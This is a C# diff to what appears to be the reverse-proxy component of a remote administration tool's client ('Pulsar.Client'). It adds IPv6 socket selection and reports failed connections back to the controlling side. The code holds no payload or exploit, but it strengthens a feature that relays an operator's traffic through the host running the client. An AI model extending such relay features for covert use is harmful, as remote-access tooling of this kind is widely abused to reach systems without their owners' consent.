@@ -1,5 +1,6 @@
 ﻿using Pulsar.Common.Messages.Administration.ReverseProxy;
 using System;
+using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 
@@ -23,10 +24,63 @@ namespace Pulsar.Client.ReverseProxy
             this.Target = command.Target;
             this.Port = command.Port;
             this.Client = client;
-            this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            this.Handle = CreateSocketForTarget(command.Target);
 
-            //Non-Blocking connect, so there is no need for a extra thread to create
-            this.Handle.BeginConnect(command.Target, command.Port, Handle_Connect, null);
+            try
+            {
+                // Non-blocking connect, so there is no need for an extra thread to create
+                this.Handle.BeginConnect(command.Target, command.Port, Handle_Connect, null);
+            }
+            catch
+            {
+                Client.Send(new ReverseProxyConnectResponse
+                {
+                    ConnectionId = ConnectionId,
+                    IsConnected = false,
+                    LocalAddress = null,
+                    LocalPort = 0,
+                    HostName = Target
+                });
+                Disconnect();
+            }
+        }
+
+        private static Socket CreateSocketForTarget(string target)
+        {
+            AddressFamily family = AddressFamily.InterNetwork;
+
+            if (IPAddress.TryParse(target, out var parsedAddress))
+            {
+                family = parsedAddress.AddressFamily;
+            }
+            else if (Socket.OSSupportsIPv6)
+            {
+                try
+                {
+                    var addresses = Dns.GetHostAddresses(target ?? string.Empty);
+                    var ipv6 = addresses.FirstOrDefault(address => address.AddressFamily == AddressFamily.InterNetworkV6);
+                    if (ipv6 != null)
+                    {
+                        family = AddressFamily.InterNetworkV6;
+                    }
+                }
+                catch
+                {
+                }
+            }
+
+            Socket socket;
+            if (family == AddressFamily.InterNetworkV6 && Socket.OSSupportsIPv6)
+            {
+                socket = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp);
+                socket.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
+            }
+            else
+            {
+                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            }
+
+            return socket;
         }
 
         private void Handle_Connect(IAsyncResult ar)
